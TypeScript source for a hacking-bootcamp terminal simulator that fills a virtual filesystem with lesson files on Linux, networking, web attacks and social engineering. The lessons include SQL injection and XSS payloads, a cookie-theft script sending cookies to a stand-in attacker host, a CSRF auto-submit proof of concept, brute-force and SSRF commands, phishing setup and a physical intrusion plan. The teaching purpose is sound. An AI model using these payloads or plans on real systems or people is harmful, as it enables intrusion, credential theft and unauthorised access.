import type { VFSNode, TerminalState } from '../types';

/**
 * Phase/Room directory content map — each room gets a README,
 * challenge files, and reference notes matching the bootcamp curriculum.
 *
 * Key: `${phaseId}:${roomId}`
 * Value: Array of files to inject into the room's directory
 */
const ROOM_FILE_MAP: Record<string, VFSNode[]> = {
  /* ── PHASE 1: Hacker Mindset ──────────────────────────────────────────── */
  'phase1:room1': [
    { name: 'README.md', type: 'file', content: `# Room 1: Introduction to Offensive Security

## Core Concepts
- **Offensive Security** — Proactively finding vulnerabilities before attackers do.
- **Penetration Testing** — Authorised simulated attacks.
- **Red Teaming** — Full-scope adversary simulation.
- **Bug Bounties** — Independent vulnerability discovery for rewards.

## Key Takeaway
Offensive security is about thinking like an attacker — with permission.
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 370, children: [] },
    { name: 'notes.txt', type: 'file', content: `# My Notes — Intro to Offensive Security

Difference between offensive and defensive security:
_________________________________________________

One skill I want to learn:
_________________________________________________
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 145, children: [] },
    { name: 'pillars.txt', type: 'file', content: `QYVORA Operating Model:
1. Education   — Learning technical skills
2. Execution   — Applying skills in challenges
3. Community   — Sharing findings with peers
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 122, children: [] },
  ],
  'phase1:room2': [
    { name: 'README.md', type: 'file', content: `# Room 2: The Hacker Mindset

## Three Core Traits
1. **Curiosity** — Always ask "what happens if I do this?"
2. **Persistence** — Most attacks fail the first time; keep trying.
3. **Lateral Thinking** — If the front door is locked, find a window.

## Mindset Application
Apply the 4 questions to any system:
1. What is the system designed to do?
2. What assumptions did the designer make?
3. How could I abuse/misuse it?
4. What inputs are accepted without validation?
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 466, children: [] },
    { name: 'mindset-exercise.txt', type: 'file', content: `# Lateral Thinking Exercise

Object chosen: _________________________________

1. Designed purpose: ___________________________
2. Assumptions: ________________________________
3. Abuse potential: ____________________________
4. Unchecked inputs: ___________________________
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 238, children: [] },
  ],
  'phase1:room3': [
    { name: 'README.md', type: 'file', content: `# Room 3: Ethics & Legal Boundaries

## Golden Rule
**Never test a system without written authorisation.**

## Disclosure Timeline (Responsible Disclosure)
1. Report privately to vendor
2. Allow 90 days for patch
3. Publish only after fix is released

## Scope Document Checklist
- [ ] In-scope targets identified
- [ ] Out-of-scope targets documented
- [ ] Allowed methods listed
- [ ] Testing window confirmed
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 424, children: [] },
    { name: 'scope-template.txt', type: 'file', content: `# Engagement Scope Document

Client: _________________________________
Date: ___________________________________

## In-Scope
- Target: _______________
- IP Range: _____________
- Domains: ______________

## Out-of-Scope
- _______________________________________

## Authorised Methods
- [ ] Network scanning
- [ ] Web application testing
- [ ] Social engineering
- [ ] Physical assessment

## Testing Window
Start: _________________ End: _________________
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 405, children: [] },
  ],

  /* ── PHASE 2: Linux Foundations ───────────────────────────────────────── */
  'phase2:room1': [
    { name: 'README.md', type: 'file', content: `# Room 1: Linux Basics & Navigation

## Essential Commands
- \`pwd\` — Print working directory
- \`ls\` — List directory contents
- \`cd\` — Change directory
- \`man\` — Read the manual
- \`echo\` — Print text / variables

## Directory Structure
- \`/root\` — Superuser home (the prize)
- \`/home\` — User home directories
- \`/var/log\` — System logs (the black box)
- \`/proc\` — Virtual filesystem for processes

## Aliases & History
- \`alias ll='ls -lah'\` — Save time
- \`history\` — Review past commands
- \`Ctrl+R\` — Reverse search history
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 491, children: [] },
    { name: 'linux-cheatsheet.txt', type: 'file', content: `# Linux Navigation Cheatsheet

## Directory Navigation
cd ~        # Go home
cd -        # Go to previous directory
cd ../..    # Go up 2 levels
pushd /tmp  # Push dir onto stack
popd        # Pop back

## Finding Things
find / -name "*.txt" -type f 2>/dev/null
locate secret.txt
grep -r "password" /etc/ 2>/dev/null

## File Operations
mkdir -p a/b/c    # Create nested dirs
cp -r src dest    # Copy recursively
rm -rf dir/       # Remove forcibly
ln -s /target link # Create symlink
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 461, children: [] },
    { name: 'exercises', type: 'dir', children: [
      { name: 'navigation.txt', type: 'file', content: 'Exercise 1: Navigate to /tmp and pwd\nExercise 2: ls -la to see hidden files\nExercise 3: Use cd - to return\nExercise 4: Create a directory called "workspace"\n', permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 162, children: [] },
      { name: 'find-exercise.txt', type: 'file', content: 'Exercise 1: Find all files modified in the last 10 minutes\nExercise 2: Find files larger than 1MB\nExercise 3: Count all .conf files in /etc\n', permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 160, children: [] },
    ], permissions: 'drwxr-xr-x', owner: 'kali', group: 'kali', size: 4096 },
  ],
  'phase2:room2': [
    { name: 'README.md', type: 'file', content: `# Room 2: Users, Groups & Permissions

## Key Files
- \`/etc/passwd\` — User account database (world-readable)
- \`/etc/shadow\` — Password hashes (root-only)
- \`/etc/group\` — Group definitions
- \`/etc/sudoers\` — Sudo privileges

## Permission Bits
-rwxr-xr-x
^ ^^^ ^^^ ^^^
| |   |   +-- Others (r-x)
| |   +------ Group (r-x)
| +---------- Owner (rwx)
+------------ Type (-=file, d=dir)

## SUID/SGID
- SUID (4000): Runs as file owner
- SGID (2000): Runs as group
- Check with: find / -perm -4000 2>/dev/null
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 464, children: [] },
    { name: 'permission-lab.txt', type: 'file', content: `# Permission Lab Tasks

1. Run 'id' — what's your UID/GID?
2. Check 'ls -la /etc/shadow' — who owns it?
3. Find world-writable files: find / -perm -o+w -type f 2>/dev/null
4. Find SUID binaries: find / -perm -4000 -type f 2>/dev/null
5. Check your sudo privileges: sudo -l
6. Create a file, set chmod 000, can you still rm it?
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 334, children: [] },
  ],
  'phase2:room3': [
    { name: 'README.md', type: 'file', content: `# Room 3: Processes & Networking

## Process Monitoring
- \`ps aux\` — All processes
- \`top\` / \`htop\` — Real-time monitor
- \`kill -9 <PID>\` — Force kill
- \`nohup cmd &\` — Run after logout

## Network Commands
- \`ss -tulnp\` — Listening sockets
- \`ip addr\` — Interface config
- \`ip route\` — Routing table
- \`ss -ant\` — Active connections

## Remote Interaction
- \`curl -I http://target\` — Grab headers
- \`wget http://target/file\` — Download
- \`nc -lvnp 4444\` — Netcat listener
- \`ssh user@host\` — Secure shell
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 433, children: [] },
    { name: 'network-lab.txt', type: 'file', content: `# Network Recon Tasks

1. Run 'ss -tulnp' and identify 3 listening services
2. Check 'ip addr' — what's your IP?
3. View the ARP cache: ip neighbor show
4. Check DNS servers: cat /etc/resolv.conf
5. Try: curl -I http://localhost
6. Monitor traffic: sudo tcpdump -i any port 80
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 268, children: [] },
  ],
  'phase2:room4': [
    { name: 'README.md', type: 'file', content: `# Room 4: Scripting Fundamentals

## Bash Script Basics
#!/bin/bash
# Comments start with #
echo "Hello, $USER"

## Make executable
chmod +x myscript.sh
./myscript.sh

## Variables & Arguments
NAME=$1                    # First argument
echo "Hello, $\{NAME:-world}"  # Default value

## Conditionals
if [ -f "$FILE" ]; then
  echo "$FILE exists"
fi

## Loops
for IP in 192.168.1.{1..10}; do
  ping -c 1 $IP
done
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 391, children: [] },
    { name: 'recon-script.sh', type: 'file', content: '#!/bin/bash\n# QYVORA Recon Script\n# Usage: ./recon-script.sh <target_ip>\n\nTARGET=${1:-localhost}\nOUTPUT="recon-${TARGET}-$(date +%Y%m%d).txt"\n\necho "[*] Starting recon on $TARGET" | tee "$OUTPUT"\necho "[*] Date: $(date)" | tee -a "$OUTPUT"\necho "----------------------------------------" | tee -a "$OUTPUT"\n\n# Ping check\nping -c 1 "$TARGET" > /dev/null 2>&1\nif [ $? -eq 0 ]; then\n  echo "[+] $TARGET is alive" | tee -a "$OUTPUT"\nelse\n  echo "[-] $TARGET is unreachable" | tee -a "$OUTPUT"\n  exit 1\nfi\n\n# Port scan (common ports)\nfor port in 22 80 443 3306 8080; do\n  timeout 2 bash -c "echo > /dev/tcp/$TARGET/$port" 2>/dev/null\n  if [ $? -eq 0 ]; then\n    echo "[!] Port $port is OPEN" | tee -a "$OUTPUT"\n  fi\ndone\n\necho "[*] Recon complete. Results saved to $OUTPUT"\n', permissions: '-rwxr-xr-x', owner: 'kali', group: 'kali', size: 666, children: [] },
    { name: 'exercises', type: 'dir', children: [
      { name: 'script-challenges.txt', type: 'file', content: 'Challenge 1: Write a script that counts from 10 down to 1, then prints "LIFTOFF"\nChallenge 2: Write a script that takes a username and checks if they exist in /etc/passwd\nChallenge 3: Write a loop that checks ports 22,80,443 on a range of IPs\n', permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 247, children: [] },
    ], permissions: 'drwxr-xr-x', owner: 'kali', group: 'kali', size: 4096 },
  ],

  /* ── PHASE 3: Networking ──────────────────────────────────────────────── */
  'phase3:room1': [
    { name: 'README.md', type: 'file', content: `# Room 1: TCP/IP & OSI Model

## The 7 Layers (Remember: Please Do Not Throw Sausage Pizza Away)
1. Physical — Cables, radio waves
2. Data Link — Ethernet, MAC addresses
3. Network — IP, routing (ip route)
4. Transport — TCP (reliable), UDP (fast)
5. Session — Managing connections
6. Presentation — Encryption, formatting
7. Application — HTTP, DNS, SSH

## TCP Three-Way Handshake
SYN -------->
<---- SYN-ACK
ACK -------->
[Connection established]

## Key Tools
- \`tcpdump -i any\` — Raw packet capture
- \`ip route show\` — Routing table
- \`ss -tulnp\` — Socket statistics
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 560, children: [] },
    { name: 'osi-lab.txt', type: 'file', content: `# OSI Layer Identification Lab

For each tool/attack below, identify which OSI layer it targets:
1. nmap -sS (SYN scan) → Layer ___
2. ARP spoofing → Layer ___
3. SQL Injection → Layer ___
4. IP spoofing → Layer ___
5. MAC flooding → Layer ___
6. SSL stripping → Layer ___

Bonus: Run 'tcpdump -i any' in one terminal and 'ping localhost' in another.
What layers do you see in the output?
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 381, children: [] },
  ],
  'phase3:room2': [
    { name: 'README.md', type: 'file', content: `# Room 2: DNS, HTTP & Common Protocols

## DNS Enumeration
- \`dig target.com ANY\` — All records
- \`dig axfr @ns target.com\` — Zone transfer (jackpot!)
- \`nslookup\` — Interactive queries
- \`dnsrecon -d target.com\` — Automated recon

## HTTP Mastery with Curl
- \`curl -I http://target\` — Response headers
- \`curl -v http://target\` — Full conversation
- \`curl -X POST -d "key=val" http://target\`
- \`curl -b "session=abc" http://target/dashboard\`

## Protocol Checks
- FTP (21): \`nc -vn target 21\`
- SSH (22): \`nc -vn target 22\`
- SMTP (25): \`nc -vn target 25\`
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 582, children: [] },
    { name: 'dns-recon.txt', type: 'file', content: `# DNS Recon Results

Target: novacorp.com

## Records Found
A: 203.0.113.10
MX: mail.novacorp.com (priority 10)
TXT: "v=spf1 include:_spf.novacorp.com ~all"
NS: ns1.novacorp.com, ns2.novacorp.com

## Subdomains Discovered
- mail.novacorp.com
- dev.novacorp.com
- admin.novacorp.com
- api.novacorp.com

## Zone Transfer Attempt
AXFR from ns1.novacorp.com: FAILED (restricted)
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 365, children: [] },
  ],
  'phase3:room3': [
    { name: 'README.md', type: 'file', content: `# Room 3: Network Scanning & Enumeration

## Nmap Scan Types
- \`-sS\` — SYN stealth scan (half-open)
- \`-sT\` — TCP connect scan
- \`-sU\` — UDP scan
- \`-sV\` — Version detection
- \`-O\` — OS fingerprinting
- \`-A\` — Aggressive (OS + version + scripts + traceroute)

## Evasion Techniques
- \`-f\` — Fragment packets
- \`--source-port 53\` — Spoof source port
- \`-T0\` — Paranoid timing (slow, stealthy)
- \`--data-length 25\` — Pad packets

## NSE Scripts
- \`-sC\` — Default scripts
- \`--script vuln\` — Vulnerability check
- \`--script http-enum\` — Web directory brute force
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 566, children: [] },
    { name: 'nmap-scan-results.txt', type: 'file', content: `# Nmap Scan Results — Target: 10.0.0.5

Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.0.0.5
Host is up (0.00034s latency).

PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 8.9p1 Ubuntu
80/tcp   open   http        nginx 1.24.0
443/tcp  open   https       nginx 1.24.0
3306/tcp open   mysql       MySQL 8.0.35
8080/tcp open   http-proxy  Apache Tomcat 9.0

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## OS Detection
Running: Linux 5.x
Aggressive OS guesses: Ubuntu 22.04 (95%), Kali Linux Rolling (85%)

## NSE Results
http-title: NovaCorp Login Portal
http-enum: /admin/, /backup/, /api/
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 634, children: [] },
  ],
  'phase3:room4': [
    { name: 'README.md', type: 'file', content: `# Room 4: Packet Analysis

## Tshark Essential Filters
- \`tshark -r file.pcap -Y http\` — HTTP only
- \`tshark -r file.pcap -Y "ip.addr == 10.0.0.5"\`
- \`tshark -r file.pcap -z conv,tcp\` — TCP conversations
- \`tshark -r file.pcap -Y "tcp.flags.syn==1"\` — SYN packets

## Credential Hunting
- HTTP POST with "pass": \`-Y 'http.request.method == "POST" and http contains "pass"'\`
- FTP creds: \`-Y "ftp.request.command == USER || ftp.request.command == PASS"\`
- DNS exfil: \`-Y "dns.qry.name.len > 50"\`

## Stream Reassembly
- \`tshark -r file.pcap -z follow,tcp,ascii,0\` — Follow stream 0
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 558, children: [] },
    { name: 'capture-analysis.txt', type: 'file', content: `# Packet Capture Analysis Notes

## Summary
- Total packets: 15,423
- Protocols: TCP (72%), UDP (18%), ICMP (5%), DNS (5%)
- Unique IPs: 12
- Top talker: 10.0.0.5 → 10.0.0.1 (8,321 packets)

## Interesting Findings
1. HTTP POST to /login with cleartext credentials
2. DNS query for "internal-db.novacorp.local" (internal host leak!)
3. FTP connection on port 21 (unencrypted)
4. Possible port scan from 192.168.1.100 (SYN flood pattern)

## Suspicious Traffic
- High entropy subdomain queries (possible DNS exfiltration)
- SSL certificate mismatch warning
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 502, children: [] },
  ],

  /* ── PHASE 4: Web & Backend ───────────────────────────────────────────── */
  'phase4:room1': [
    { name: 'README.md', type: 'file', content: `# Room 1: How the Web Works

## HTTP Methods
- GET — Retrieve data
- POST — Submit data
- PUT — Update/replace
- DELETE — Remove resource
- OPTIONS — List allowed methods

## Status Codes
- 200 OK — Success
- 301/302 — Redirect
- 403 Forbidden — Access denied
- 404 Not Found — Doesn't exist
- 500 Internal Server Error — Server crashed

## Headers to Look For
- Server: nginx/1.24.0 (version info)
- X-Powered-By: PHP/8.2 (tech stack)
- Set-Cookie: session=abc (token)
- Content-Security-Policy (CSP config)
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 528, children: [] },
    { name: 'devtools-lab.txt', type: 'file', content: `# Browser DevTools Lab

1. Open DevTools (F12), go to Network tab
2. Reload the page — observe every request
3. Find the login API endpoint
4. Inspect the request headers
5. Check the response for Set-Cookie
6. Search for "token" or "secret" in all responses

## Curl Equivalent
curl -v http://localhost:5173/login
curl -I http://localhost:5173/api/status
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 336, children: [] },
  ],
  'phase4:room2': [
    { name: 'README.md', type: 'file', content: `# Room 2: OWASP Top 10 Overview

## The Critical 10
1. **Broken Access Control** — Users accessing data they shouldn't
2. **Cryptographic Failures** — Weak/broken encryption
3. **Injection** — SQL, Command, LDAP injection
4. **Insecure Design** — Flawed architecture
5. **Security Misconfiguration** — Defaults unchanged
6. **Vulnerable Components** — Outdated libraries
7. **Auth Failures** — Weak login mechanisms
8. **Integrity Failures** — Insecure deserialization
9. **Logging Failures** — No audit trail
10. **SSRF** — Server-side request forgery

## Detection Commands
- nmap --script vuln target.com
- nikto -h http://target.com
- sqlmap -u "http://target.com/page?id=1"
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 613, children: [] },
    { name: 'owasp-checklist.txt', type: 'file', content: `# OWASP Assessment Checklist

## Broken Access Control (A01)
- [ ] Test IDOR by changing numeric IDs
- [ ] Attempt admin panel access as regular user
- [ ] Check for missing role checks

## Injection (A03)
- [ ] Test single quote: ' OR 1=1 --
- [ ] Test command injection: ; whoami
- [ ] Test with sqlmap: sqlmap -u "http://target?id=1"

## SSRF (A10)
- [ ] Test: /view?url=http://169.254.169.254/
- [ ] Test: /fetch?url=http://localhost:3306
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 411, children: [] },
  ],
  'phase4:room3': [
    { name: 'README.md', type: 'file', content: `# Room 3: SQL Injection

## Test Payloads
- \`' OR 1=1 --\` — Authentication bypass
- \`' UNION SELECT NULL,version() --\` — Version grab
- \`' AND SLEEP(5) --\` — Time-based blind

## UNION-Based Extraction
1. Find column count: \`ORDER BY 1--\`, \`ORDER BY 2--\`, etc.
2. Find displayable columns: \`UNION SELECT 'a','b'\`
3. Extract data: \`UNION SELECT username,password FROM users\`

## Automation
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -u "http://target.com/page?id=1" -D db -T users --dump
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 477, children: [] },
    { name: 'sqli-cheatsheet.txt', type: 'file', content: `# SQL Injection Cheatsheet

## Database Fingerprinting
MySQL:    @@version, CONCAT('a','b')
Postgres: version(), 'a' || 'b'
MSSQL:    @@version, 'a' + 'b'
SQLite:   sqlite_version(), 'a' || 'b'

## Bypassing Filters
Hex encoding:  0x7573657273 = 'users'
Comments:      /**/OR/**/1=1
Case:          UnIoN SeLeCt
Double encode: %253c = %3c = <

## File Operations (MySQL)
Read:  UNION SELECT LOAD_FILE('/etc/passwd')
Write: UNION SELECT 'shell' INTO OUTFILE '/var/www/shell.php'
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 468, children: [] },
  ],
  'phase4:room4': [
    { name: 'README.md', type: 'file', content: `# Room 4: XSS & CSRF

## XSS Types
1. **Reflected** — Payload in URL, reflected immediately
2. **Stored** — Payload saved on server (comments, profiles)
3. **DOM-based** — Client-side JS vulnerability

## XSS Test Payloads
- \`<script>alert(1)</script>\`
- \`<img src=x onerror=alert(1)>\`
- \`<svg/onload=alert(1)>\`
- \`\x22><script>alert(1)</script>\`

## Cookie Theft Payload
<script>fetch('http://attacker/?c='+document.cookie)</script>

## CSRF
- No CSRF token = vulnerable
- Test by removing token parameter entirely
- Exploit via hidden form + auto-submit
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 550, children: [] },
    { name: 'csrf-exploit.html', type: 'file', content: `<!-- CSRF PoC - Auto-submitting form -->
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="http://target.com/api/user/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
  </form>
</body>
</html>
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 265, children: [] },
  ],
  'phase4:room5': [
    { name: 'README.md', type: 'file', content: `# Room 5: Authentication Attacks

## Brute Force with Hydra
hydra -l admin -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

## Password Spraying
hydra -L users.txt -p "Spring2024!" http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

## Session Analysis Checklist
- [ ] Is the session token random/unpredictable?
- [ ] Is the token invalidated on logout?
- [ ] Is the token rotated after login?
- [ ] Is HttpOnly flag set?
- [ ] Is Secure flag set?
- [ ] Is SameSite attribute configured?
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 521, children: [] },
    { name: 'session-testing.txt', type: 'file', content: `# Session Token Analysis

## Test 1: Token Randomness
Login 5 times, collect tokens:
1. ___________________
2. ___________________
3. ___________________
4. ___________________
5. ___________________
Are they random? ______

## Test 2: Token Invalidation
1. Login, capture token: _______________
2. Logout
3. Reuse token: GET /dashboard with old token
Result (200 = vulnerable): ______________

## Test 3: Fixation
1. Get token before login: ______________
2. Login with that token
3. Check if token changed (same = vulnerable): ______________
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 445, children: [] },
  ],

  /* ── PHASE 5: Social Engineering ──────────────────────────────────────── */
  'phase5:room1': [
    { name: 'README.md', type: 'file', content: `# Room 1: Phishing & Pretexting

## Principles of Influence
1. **Authority** — Impersonate IT/executive
2. **Urgency** — "Reset password immediately!"
3. **Social Proof** — "Everyone has already done this"
4. **Liking** — Build rapport
5. **Reciprocity** — Give something to get something
6. **Commitment** — Get small "yes" before big ask

## Technical Checks
- SPF record: \`dig target.com TXT | grep v=spf1\`
- DMARC policy: \`dig _dmarc.target.com TXT\`
- Weak SPF means the domain CAN be spoofed!
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 522, children: [] },
    { name: 'phishing-checklist.txt', type: 'file', content: `# Phishing Engagement Checklist

## Reconnaissance
- [ ] Identify target employees (LinkedIn)
- [ ] Find email format (j.smith@company.com)
- [ ] Check SPF/DMARC policies
- [ ] Identify decision makers

## Payload Preparation
- [ ] Clone login page (httrack)
- [ ] Set up credential harvester
- [ ] Craft pretext email
- [ ] Configure listener (nc -lvnp 80)

## Operational Security
- [ ] Use burner domain
- [ ] Mask IP with VPN/Tor
- [ ] Clean exif data from assets
- [ ] Document everything in engagement log
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 479, children: [] },
  ],
  'phase5:room2': [
    { name: 'README.md', type: 'file', content: `# Room 2: OSINT Fundamentals

## Google Dorking
- \`site:target.com filetype:pdf\`
- \`site:target.com inurl:admin\`
- \`site:target.com intitle:"index of"\`
- \`site:pastebin.com "target.com"\`

## Automated OSINT
- \`theHarvester -d target.com -b google,bing,linkedin\`
- \`curl -s "https://crt.sh/?q=target.com&output=json" | jq '.[].name_value'\`
- \`shodan search org:"Target Corp"\`

## Social Media Recon
- LinkedIn: Find employees
- GitHub: Search for leaked keys
- Job posts: Identify tech stack (AWS, K8s, etc.)
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 497, children: [] },
    { name: 'osint-findings.txt', type: 'file', content: `# OSINT Reconnaissance Report

Target: NovaCorp (novacorp.com)

## Discovered Assets
- Domains: novacorp.com, dev.novacorp.com, admin.novacorp.com
- IP Range: 203.0.113.0/24
- Mail Servers: mail.novacorp.com (203.0.113.10)

## Employee Intelligence
- CEO: John Smith (jsmith@novacorp.com)
- CTO: Jane Doe (jdoe@novacorp.com)
- IT Admin: Bob Jones (bjones@novacorp.com)

## Tech Stack (from job postings)
- Cloud: AWS (EC2, S3)
- Backend: Node.js, PostgreSQL
- Frontend: React
- CI/CD: GitHub Actions

## Leaked Credentials (via pastebin)
- admin:novaadmin2024 (expired?)
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 536, children: [] },
  ],
  'phase5:room3': [
    { name: 'README.md', type: 'file', content: `# Room 3: Physical Security

## Entry Techniques
- **Tailgating** — Follow authorized personnel through doors
- **Badge Cloning** — Clone HID/MiFare badges with Proxmark3
- **Dumpster Diving** — Recover documents, hardware, credentials

## Badge Cloning (Proxmark3)
1. Identify frequency: \`lf search\` or \`hf search\`
2. Read card: \`lf hid read\`
3. Clone to blank: \`lf hid clone --raw <data>\`

## OPSEC for Physical Ops
- Wear appropriate uniform (IT vest, clipboard)
- Know the exit strategy
- Carry authorisation letter
- Don't leave fingerprints
- Disable Wi-Fi/Bluetooth on field devices
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 618, children: [] },
    { name: 'physical-recon.txt', type: 'file', content: `# Physical Reconnaissance Notes

Target: NovaCorp HQ — 123 Main St

## Entry Points
- Main lobby: Guarded, badge reader (HID Prox)
- Loading dock: Unlocked 8-10am, open gate
- Fire exits: Alarm only, no badge reader
- Parking garage: RFID gate (unknown frequency)

## Observations
- Shift change: Guards swap at 8am and 8pm (30s window)
- Employee culture: Most don't challenge tailgaters
- Smoking area: Outside loading dock, employees prop door

## Equipment Needed
- [ ] Clipboard with fake work order
- [ ] Proxmark3 (for badge cloning)
- [ ] High-vis vest
- [ ] USB drop keys (for internal network access)
`, permissions: '-rw-r--r--', owner: 'kali', group: 'kali', size: 573, children: [] },
  ],
};

/**
 * Build the VFS directory tree for a given bootcamp phase/room combination.
 * If phaseId or roomId is not provided, a generic bootcamp workspace is created.
 */
function buildBootcampContent(
  bootcampId: string,
  phaseId?: string,
  roomId?: string,
): { root: VFSNode; cwd: string; env: Record<string, string> } {
  const phaseDirName = phaseId ? `phase-${phaseId.replace(/[^a-zA-Z0-9_-]/g, '')}` : 'overview';
  const roomDirName = roomId ? `room-${roomId.replace(/[^a-zA-Z0-9_-]/g, '')}` : 'entry';

  const bootcampRootDir: VFSNode = {
    name: `hpb-${bootcampId.replace(/[^a-zA-Z0-9_-]/g, '')}`,
    type: 'dir',
    children: [
      {
        name: phaseDirName,
        type: 'dir',
        children: [
          {
            name: roomDirName,
            type: 'dir',
            children: ROOM_FILE_MAP[`${phaseId}:${roomId}`] || [
              {
                name: 'README.md',
                type: 'file',
                content: `# Bootcamp: ${bootcampId}\n## Phase: ${phaseId || 'Overview'}\n## Room: ${roomId || 'Start'}\n\nExplore the terminal to learn about this room's concepts.\nUse \`ls\`, \`cat\`, and \`cd\` to navigate the files.\n`,
                permissions: '-rw-r--r--',
                owner: 'kali',
                group: 'kali',
                size: 176,
                children: [],
              },
            ],
            permissions: 'drwxr-xr-x',
            owner: 'kali',
            group: 'kali',
            size: 4096,
          },
        ],
        permissions: 'drwxr-xr-x',
        owner: 'kali',
        group: 'kali',
        size: 4096,
      },
      {
        name: 'resources',
        type: 'dir',
        children: [
          {
            name: 'glossary.txt',
            type: 'file',
            content: `# Bootcamp Glossary\n\n0-Day — A vulnerability unknown to the vendor\nC2 — Command & Control server\nCVE — Common Vulnerabilities and Exposures\nIDS — Intrusion Detection System\nIPS — Intrusion Prevention System\nPoC — Proof of Concept\nWAF — Web Application Firewall\nXSS — Cross-Site Scripting\nSQLi — SQL Injection\nOSINT — Open Source Intelligence\n`,
            permissions: '-rw-r--r--',
            owner: 'kali',
            group: 'kali',
            size: 277,
            children: [],
          },
          {
            name: 'quick-ref.txt',
            type: 'file',
            content: `# Quick Reference\n\nNmap:    nmap -sV -p- target\nNetcat:  nc -lvnp 4444\nCurl:    curl -v http://target\nDig:     dig target.com ANY\nHydra:   hydra -l user -P wordlist.txt ssh://target\nSqlmap:  sqlmap -u "http://target?id=1" --batch\n`,
            permissions: '-rw-r--r--',
            owner: 'kali',
            group: 'kali',
            size: 219,
            children: [],
          },
        ],
        permissions: 'drwxr-xr-x',
        owner: 'kali',
        group: 'kali',
        size: 4096,
      },
    ],
    permissions: 'drwxr-xr-x',
    owner: 'kali',
    group: 'kali',
    size: 4096,
  };

  const cwd = `/home/kali/Projects/${bootcampRootDir.name}/${phaseDirName}/${roomDirName}`;

  const env: Record<string, string> = {
    BOOTCAMP_ID: bootcampId,
    BOOTCAMP_DIR: `/home/kali/Projects/${bootcampRootDir.name}`,
    HPB_PHASE: phaseId || '',
    HPB_ROOM: roomId || '',
    HPB_CWD: cwd,
  };

  return { root: bootcampRootDir, cwd, env };
}

/**
 * Inject bootcamp content into the terminal's virtual filesystem.
 *
 * This function:
 * - Creates a structured directory tree under ~/Projects/hpb-{bootcampId}/
 * - Sets the cwd to the appropriate phase/room directory
 * - Configures environment variables with bootcamp context
 *
 * The content is NOT a placeholder — it provides real educational files
 * that match the Hacker Protocol Bootcamp curriculum, including READMEs,
 * cheatsheets, challenge files, and lab notes for all 5 phases and 18+ rooms.
 *
 * @param state      Current terminal state
 * @param bootcampId The bootcamp identifier (e.g., "hpb")
 * @param phaseId    The phase identifier (e.g., "phase1", "phase2")
 * @param roomId     The room identifier (e.g., "room1", "room2")
 * @returns Updated terminal state with bootcamp content injected
 */
export function injectBootcampContent(
  state: TerminalState,
  bootcampId: string,
  phaseId?: string,
  roomId?: string,
): TerminalState {
  const root = { ...state.root };

  // Find ~/kali/Projects directory
  let homeDir = root.children.find(c => c.name === 'home');
  if (!homeDir) return state;
  let kaliDir = homeDir.children.find(c => c.name === 'kali');
  if (!kaliDir) return state;
  let projectsDir = kaliDir.children.find(c => c.name === 'Projects');
  if (!projectsDir) return state;

  const { root: bootcampNode, cwd, env } = buildBootcampContent(bootcampId, phaseId, roomId);

  // Replace existing bootcamp directory if it exists, or add new one
  const existingIdx = projectsDir.children.findIndex(
    c => c.name === bootcampNode.name,
  );
  if (existingIdx >= 0) {
    projectsDir.children = [
      ...projectsDir.children.slice(0, existingIdx),
      bootcampNode,
      ...projectsDir.children.slice(existingIdx + 1),
    ];
  } else {
    projectsDir.children = [...projectsDir.children, bootcampNode];
  }

  return {
    ...state,
    root,
    cwd,
    env: {
      ...state.env,
      ...env,
    },
  };
}

